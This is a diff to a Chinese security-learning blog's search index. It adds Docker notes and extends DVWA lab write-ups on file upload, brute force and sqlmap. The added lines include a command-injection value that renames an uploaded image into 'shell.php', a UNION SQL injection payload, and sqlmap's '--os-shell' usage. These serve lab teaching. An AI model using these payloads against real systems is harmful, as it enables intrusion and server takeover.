+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">新建容器并启动：docker <span class="built_in">run</span> [options] image [command]</span><br><span class="line">eg:docker <span class="built_in">run</span> -it -p 3366:3306 mysql</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/02/26/docker/image-20230629225851081.png" alt="image-20230629225851081"></p>
+<figure class="highlight inform7"><table><tr><td class="code"><pre><span class="line">获取日志：docker logs <span class="comment">[options]</span> <span class="keyword">container</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">查看运行中容器：docker ps </span><br><span class="line">查看所有容器：docker ps -a</span><br><span class="line">停止<span class="regexp">/重启/</span>启动容器：docker stop<span class="regexp">/restart/</span>start [container id]或[names]</span><br></pre></td></tr></table></figure>
+<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">进入容器：当<span class="built_in">run</span>的时候使用-d的参数会导致容器启动后进入后台</span><br><span class="line">docker attach [container <span class="built_in">id</span>]		会导致容器停止</span><br><span class="line">docker exec [container <span class="built_in">id</span>]		不会导致容器停止</span><br></pre></td></tr></table></figure>
+<figure class="highlight inform7"><table><tr><td class="code"><pre><span class="line">导出</span><br><span class="line">docker export <span class="comment">[container id]</span> &gt; <span class="comment">[file.tar]</span></span><br><span class="line">导入</span><br><span class="line">cat docker/<span class="comment">[file.tar]</span> | docker import - <span class="comment">[image]</span>:<span class="comment">[image tag]</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">查看网络端口</span><br><span class="line">docker port <span class="selector-attr">[container id]</span>或<span class="selector-attr">[names]</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">更新镜像</span><br><span class="line">运行的容器内使用apt-<span class="built_in">get</span> update进行更新</span><br><span class="line">退出后提交容器副本</span><br><span class="line">docker commit <span class="attribute">-m</span>=<span class="string">&quot;提交的描述信息&quot;</span> <span class="attribute">-a</span>=<span class="string">&quot;指定镜像作者&quot;</span> [id] [镜像名]</span><br></pre></td></tr></table></figure>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">docker网络</span><br><span class="line">docker network create -d <span class="selector-attr">[网络类型]</span> <span class="selector-attr">[name]</span></span><br><span class="line">网络类型：bridge、overlay</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/02/26/docker/image-20230630001732104.png" alt="image-20230630001732104"></p>
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="web应用"><a href="#web应用" class="headerlink" title="web应用"></a>web应用</h3>]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>docker</tag>
+      </tags>
   </entry>
   <entry>
     <title>人工智能</title>
@@ -2260,6 +3289,8 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
 <h2 id="菜刀"><a href="#菜刀" class="headerlink" title="菜刀"></a>菜刀</h2><p><a href="https://github.com/gjy20001003/resourse">gjy20001003/resourse: 一些工具的存放地 (github.com)</a></p>
 <h2 id="剑蚁"><a href="#剑蚁" class="headerlink" title="剑蚁"></a>剑蚁</h2><p><a href="https://github.com/gjy20001003/resourse">gjy20001003/resourse: 一些工具的存放地 (github.com)</a></p>
 <h2 id="jsp阅读器"><a href="#jsp阅读器" class="headerlink" title="jsp阅读器"></a>jsp阅读器</h2><p><a href="https://github.com/gjy20001003/resourse">gjy20001003/resourse: 一些工具的存放地 (github.com)</a></p>
+<h2 id="短链"><a href="#短链" class="headerlink" title="短链"></a>短链</h2><p>MRW短链接：<a href="http://home.mrw.so/">http://home.mrw.so/</a><br>百度短链接：<a href="https://dwz.cn/">https://dwz.cn/</a><br>谷歌短链接：<a href="https://goo.gl/">https://goo.gl/</a></p>
+<h2 id="时间戳"><a href="#时间戳" class="headerlink" title="时间戳"></a>时间戳</h2><p><a href="https://tool.lu/timestamp/">时间戳(Unix timestamp)转换工具 - 在线工具 (tool.lu)</a></p>
 ]]></content>
       <categories>
         <category>编程语言</category>
@@ -4286,11 +5317,16 @@ n-1轮处理：循环遍历所有顶点，找到还没确定最短路径，且di
 <h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><p>源代码中</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uploaded_ext</span>  = <span class="title function_ invoke__">substr</span>( <span class="variable">$uploaded_name</span>, <span class="title function_ invoke__">strrpos</span>( <span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
 <p>将输出文件名.后所有信息然后送去if语句验证。同时使用getimagesize()函数限制了上传文件的文件头必须是图像类型。<br>那就先做一个图片马<br><img src="/2022/08/19/uploadfile/image-20220819141118474.png" alt><br>b表示二进制文件，a表示ascll码文件<br>图片马就制作好了，看起来平平无奇谁能想到里面藏着木马呢<br><img src="/2022/08/19/uploadfile/image-20220819141342629.png" style="zoom:50%;"></p>
-<p>抓个包看看，在图片的末尾也看到了，可惜菜刀和剑蚁连不上应该是无法解析图片的问题<br><img src="/2022/08/19/uploadfile/image-20220819143008852-16608940380672.png" alt><br>成功上传<br><img src="/2022/08/19/uploadfile/image-20220819142200672-16608940336041.png" alt></p>
+<p>抓个包看看，在图片的末尾也看到了，可惜菜刀和剑蚁连不上应该是无法解析图片的问题，需要借助命令执行漏洞<br><img src="/2022/08/19/uploadfile/image-20220819143008852-16608940380672.png" alt><br>成功上传<br><img src="/2022/08/19/uploadfile/image-20220819142200672-16608940336041.png" alt></p>
+<p>在命令执行界面将jpg文件转换为php文件：127.0.0.1|move D:phpstudy/WWW/dvwa/hackable/uploads/3.jpg D:/phpstudy/WWW/dvwa/hackable/uploads/shell.php    </p>
+<p><img src="/2022/08/19/uploadfile/image-20230625004103485.png" alt="image-20230625004103485"></p>
+<p><img src="/2022/08/19/uploadfile/image-20230625005254448.png" alt="image-20230625005254448"></p>
 <h3 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$target_file</span>   =  <span class="title function_ invoke__">md5</span>( <span class="title function_ invoke__">uniqid</span>() . <span class="variable">$uploaded_name</span> ) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$uploaded_ext</span>;</span><br><span class="line"><span class="variable">$temp_file</span>    .= DIRECTORY_SEPARATOR . <span class="title function_ invoke__">md5</span>( <span class="title function_ invoke__">uniqid</span>() . <span class="variable">$uploaded_name</span> ) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$uploaded_ext</span>;</span><br></pre></td></tr></table></figure>
 <p>使用md5重命名防止截断跳过</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br></pre></td></tr></table></figure>
 <p>加入Anti-CSRF token防护CSRF攻击</p>
+<p>1’ union select 1,group_concat(column_name) from information_schema.columns where table_name = ‘users’#</p>
+<p>1’ union select 1,group_concat(column_name) from information_schema.columns where table_name = ‘users’#</p>
 ]]></content>
       <categories>
         <category>web攻防</category>
@@ -4521,7 +5557,7 @@ n-1轮处理：循环遍历所有顶点，找到还没确定最短路径，且di
     <url>/2022/08/16/force/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>暴力破解或称为穷举法，是一种针对于密码的破译方法，即将密码进行逐个推算直到找出真正的密码为止。例如一个已知是四位并且全部由数字组成的密码，其可能共有10000种组合，因此最多尝试10000次就能找到正确的密码。理论上利用这种方法可以破解任何一种密码，问题只在于如何缩短试误时间。有些人运用计算机来增加效率，有些人辅以字典来缩小密码组合的范围</p>
 <span id="more"></span>
-<h2 id="burp-suite-攻击模式"><a href="#burp-suite-攻击模式" class="headerlink" title="burp suite 攻击模式"></a>burp suite 攻击模式</h2><p>Sniper:对变量一次进行破解，多个标记依次进行。（俗话简单来说就是，用户名和密码用的是一套字典，破解的时候也只是导入一个字典，但是它会根据先破解用户名，破解出来以后急需破解密码这样的顺序，对于简单的用户名密码字典数目少的可以考虑）</p>
+<h2 id="burp-suite-攻击模式"><a href="#burp-suite-攻击模式" class="headerlink" title="burp suite 攻击模式"></a>burp suite 攻击模式</h2><p>Sniper:对变量一次进行破解，多个标记依次进行。（俗话简单来说就是，用户名和密码用的是一套字典，破解的时候也只是导入一个字典，但是它会根据先破解用户名，破解出来以后继续破解密码这样的顺序，对于简单的用户名密码字典数目少的可以考虑）</p>
 <p>Battering ram:对变量同时进行破解，多个标记同时进行。（这个也是只有一个字典但区别是，可以同时进行，就是先破解用户名破解完了继续破解密码，相比遇上一个速度更快）</p>
 <p>Pitchfork:每一个变量标记对应一个字典，取每个字典的对应项。（这个意思就是，每个变量一个字典，破解的时候每个字典的一号对应另一个字典的一号进行破解，这样破解对于那些一一对应的用户名密码来说速度很快，但很明显我们没办法准确的定位用户名和密码，显然不适用于每个情况）</p>
 <p>Cluster bomb：每个变量对应一个字典，并且进行交际破解，尝试各种组合，适合于用户名加密码破解。（这种情况就是普罗大众很容易明白理解的情况就是多个字典进行笛卡尔积，依次破解，这种就会有多种组合，时间上也是一个问题，当然对于需要用时很长的，我们可以添加进程，用来适量缩短时间）</p>
@@ -4536,8 +5572,11 @@ n-1轮处理：循环遍历所有顶点，找到还没确定最短路径，且di
 <h2 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h2><p>源代码</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$user</span> );</span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="title function_ invoke__">sleep</span>( <span class="title function_ invoke__">rand</span>( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure>
 <p>代码加入了token，可以抵御CSRF攻击，同时增加了爆破的难度，登陆验证时提交了四个参数<br>token的目的是为了减轻服务器压力，减少频繁的查询数据库，使服务器更加健壮。</p>
+<p>基于Token的身份验证过程如下<br>1.⽤户通过⽤户名和密码发送请求。<br>2.服务器端程序验证。<br>3.服务器端程序返回⼀个带签名的token 给客户端。<br>4.客户端储存token,并且每次访问API都携带Token到服务器端的。<br>5.服务端验证token，校验成功则返回请求数据，校验失败则返回错误码。</p>
 <h3 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h3><p>同样随便输抓个包看一下<br><img src="/2022/08/16/force/image-20220816163602836.png" style="zoom:67%;"><br>返回了个<img src="/2022/08/16/force/image-20220816165137129.png" alt></p>
-<p>我们可以看到他同时提交了四个参数usename,password,login,user_token<br><img src="/2022/08/16/force/image-20220816163704341.png" alt><br>爆破走起，参数调整准备轰炸（为了节约时间没有导入大数据字典)<br><img src="/2022/08/16/force/image-20220817100950217.png" alt><br><img src="/2022/08/16/force/image-20220817101005531.png" alt><br>此处一串符号为options中gerp-extract选入的token值<br><img src="/2022/08/16/force/image-20220817101118814.png" alt><br>上下文不照是因为又开了一个三位爆破的进程在运行笛卡尔积情况下的爆破，所以是一个新的请求位置就是这个位置。<br>找最与众不同的那个<br><img src="/2022/08/16/force/image-20220817101411420.png" alt><br><img src="/2022/08/16/force/image-20220817101438555.png" alt><br>成功登录</p>
+<p>我们可以看到他同时提交了四个参数usename,password,login,user_token,比如选择password和token作为爆破对象，攻击方式选择Pitchfork。<br><img src="/2022/08/16/force/image-20220816163704341.png" alt><br>爆破走起，参数调整准备轰炸（为了节约时间没有导入大数据字典)<br><img src="/2022/08/16/force/image-20220817100950217.png" alt><br><img src="/2022/08/16/force/image-20220817101005531.png" alt><br>此处一串符号为options中gerp-extract选入的token值<br><img src="/2022/08/16/force/image-20220817101118814.png" alt></p>
+<p>payload set2则选择type为Recursive grep<br><img src="/2022/08/16/force/image-20230624172324781.png" alt="image-20230624172324781"></p>
+<p>上下文不照是因为又开了一个三位爆破的进程在运行笛卡尔积情况下的爆破，所以是一个新的请求位置就是这个位置。<br>找最与众不同的那个<br><img src="/2022/08/16/force/image-20220817101411420.png" alt><br><img src="/2022/08/16/force/image-20220817101438555.png" alt><br>成功登录</p>
 <h2 id="impossible级别"><a href="#impossible级别" class="headerlink" title="impossible级别"></a>impossible级别</h2><p>相比于high级别主要多了以下代码<br><img src="/2022/08/16/force/image-20220817102357929.png" alt><br>每登陆失败三次就要等15s钟<br><img src="/2022/08/16/force/image-20220817102441140.png" alt><br><img src="/2022/08/16/force/image-20220817102505788.png" alt><br><img src="/2022/08/16/force/image-20220817102543236.png" alt><br><img src="/2022/08/16/force/image-20220817102602350.png" alt><br>采用了更为安全的PDO机制防御sql注入</p>
 ]]></content>
       <categories>
@@ -4618,7 +5657,10 @@ S ='a_1a_2....a_n'</script><p>S：串名       n：串的长度   n=0时成为�
     <url>/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>sqlmap的get使用方法和post使用方法以及其他技巧(更新ing~)</p>
 <span id="more"></span>
-<h2 id="get使用方法"><a href="#get使用方法" class="headerlink" title="get使用方法"></a>get使用方法</h2><p>(1)查看是否有注入点：sqlmap -u 网址<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815143754072.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815143808583.png" alt><br>证明有注入点<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815143944207.png" alt><br>得到服务器操作系统为linux centOS，后端语言为php，数据库为mysql</p>
+<h2 id="get使用方法"><a href="#get使用方法" class="headerlink" title="get使用方法"></a>get使用方法</h2><p>(1)查看是否有注入点：sqlmap -u 网址<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815143754072.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815143808583.png" alt><br>证明有注入点</p>
+<p><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20230625115053214.png" alt="image-20230625115053214"></p>
+<p>出现了302重定向会返回登录界面，证明这个需要cookie，提供抓包获得的cookie</p>
+<p><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815143944207.png" alt><br>得到服务器操作系统为linux centOS，后端语言为php，数据库为mysql</p>
 <p>(2)获取数据库<br>        ((1))获取全部数据库<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815144244725.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815144303120.png" alt><br>        ((2))获取当前数据库<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815144412391.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815144432759.png" alt="image-20220815144432759"></p>
 <p>(3)获取当前数据库里所有表<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815144547931.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815144611455.png" alt="image-20220815144611455"></p>
 <p>(4)获取表的字段<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815145336829.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815145356494.png" alt></p>
@@ -4626,6 +5668,17 @@ S ='a_1a_2....a_n'</script><p>S：串名       n：串的长度   n=0时成为�
 <h2 id="post使用方法"><a href="#post使用方法" class="headerlink" title="post使用方法"></a>post使用方法</h2><p>通过burp抓包请求<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815150536388.png" alt><br>用txt形式保存<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815150558636.png" alt><br>检验注入点<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815150625346.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815150643242.png" alt="image-20220815150643242"><br>获取库名<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815150734338.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815150746967.png" alt><br>其余步骤与get一样</p>
 <h2 id="指定位置的注入"><a href="#指定位置的注入" class="headerlink" title="指定位置的注入"></a>指定位置的注入</h2><p>在想注入的地方加<em><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815151258357.png" alt><br>运行sqlmap后就会探测到</em>号<br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815151341838.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815151409577.png" alt="image-20220815151409577"></p>
 <h2 id="盲注使用不接收http-body"><a href="#盲注使用不接收http-body" class="headerlink" title="盲注使用不接收http body"></a>盲注使用不接收http body</h2><p><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815151536755.png" alt><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20220815151554688.png" alt="image-20220815151554688"></p>
+<h2 id="跨页面抓包"><a href="#跨页面抓包" class="headerlink" title="跨页面抓包"></a>跨页面抓包</h2><p><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20230625121604328.png" alt="image-20230625121604328"><br><img src="/2022/08/15/sqlmap%E4%BD%BF%E7%94%A8/image-20230625121656290.png" alt="image-20230625121656290"></p>
+<h2 id="os-shell的利用条件及原理"><a href="#os-shell的利用条件及原理" class="headerlink" title="os-shell的利用条件及原理"></a>os-shell的利用条件及原理</h2><p>利用条件</p>
+<ul>
+<li>root权限</li>
+<li>知道绝对路径</li>
+<li>GPC关闭</li>
+<li>secure_file_priv参数为空或者为指定路径</li>
+</ul>
+<p>原理<br>    先对目标进行一个基础信息的探测，然后上传shell到目标web网站上，利用shell传参进行命令执行，退出时删除shell<br>    不同数据库必要条件也不同，例如sqlserver需要数据库支持外连，数据库权限为SA权限，主要利用xp_cmdshell扩展进行命令执行</p>
+<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="symbol">&#x27;url</span>&#x27; <span class="comment">--os-shell</span></span><br></pre></td></tr></table></figure>
+<p>成功后可以对操作系统进行控制<br>输入—sql-shell则是对数据库的控制</p>
 ]]></content>
       <categories>
         <category>web攻防</category>
